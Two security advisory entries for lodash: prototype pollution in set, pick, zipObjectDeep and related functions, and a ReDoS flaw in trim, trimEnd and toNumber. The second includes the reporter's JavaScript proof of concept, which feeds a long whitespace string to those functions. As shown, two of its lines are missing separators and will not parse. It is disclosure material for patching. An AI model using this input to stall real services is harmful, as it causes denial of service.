lodash
OSV ID: GHSA-p6mc-m468-83gw
Summary: Prototype Pollution in lodash
Details: Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The functions `pick`, `set`, `setWith`, `update`, `updateWith`, and `zipObjectDeep` allow a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires manipulating objects based on user-provided property values or arrays.

This vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.

OSV ID: GHSA-29mw-wpgm-hmr9
Summary: Regular Expression Denial of Service (ReDoS) in lodash
Details: All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. 

Steps to reproduce (provided by reporter Liyuan Chen):
```js
var lo = require('lodash');

function build_blank(n) {
    var ret = "1"
    for (var i = 0; i < n; i++) {
        ret += " "
    }
    return ret + "1";
}
var s = build_blank(50000) var time0 = Date.now();
lo.trim(s) 
var time_cost0 = Date.now() - time0;
console.log("time_cost0: " + time_cost0);
var time1 = Date.now();
lo.toNumber(s) var time_cost1 = Date.now() - time1;
console.log("time_cost1: " + time_cost1);
var time2 = Date.now();
lo.trimEnd(s);
var time_cost2 = Date.now() - time2;
console.log("time_cost2: " + time_cost2);
```
